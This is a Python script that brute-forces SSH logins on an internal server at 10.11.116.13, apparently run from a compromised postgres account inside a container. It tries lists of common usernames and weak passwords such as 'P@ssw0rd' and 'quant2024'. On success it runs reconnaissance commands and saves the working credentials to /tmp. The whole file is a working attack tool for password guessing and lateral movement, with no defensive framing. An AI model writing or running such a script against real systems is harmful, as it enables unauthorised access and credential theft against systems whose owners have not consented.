import sys
sys.path.insert(0,"/var/lib/postgresql/.local/lib/python3.12/site-packages")
import paramiko

# Target: 10.11.116.13 (internal PG server — SSH open from container)
host = "10.11.116.13"
users = ["root","admin","postgres","ubuntu","centos","ec2-user","quant","grafana","deploy"]
passwords = ["admin123","password","root","quant","grafana","123456","Aa123456","quant_admin","Quant123","changeme","P@ssw0rd","postgres","trading123","kline123","quantkline","quant2024","Quant@123","Admin@123","1qaz2wsx"]

for u in users:
    for p in passwords:
        try:
            c = paramiko.SSHClient()
            c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            c.connect(host, 22, u, p, timeout=8, look_for_keys=False, allow_agent=False)
            stdin, stdout, stderr = c.exec_command("id && hostname && uname -a && cat /etc/os-release | head -3")
            out = stdout.read().decode()
            with open("/tmp/ssh_internal_success.txt", "w") as f:
                f.write(f"USER:{u} PASS:{p}\n{out}")
            c.close()
            sys.exit(0)
        except paramiko.AuthenticationException:
            continue
        except Exception as e:
            with open("/tmp/ssh_internal_err.txt", "a") as f:
                f.write(f"{u}:{p} -> {str(e)[:80]}\n")
            break
with open("/tmp/ssh_internal_err.txt", "a") as f:
    f.write("EXHAUSTED\n")
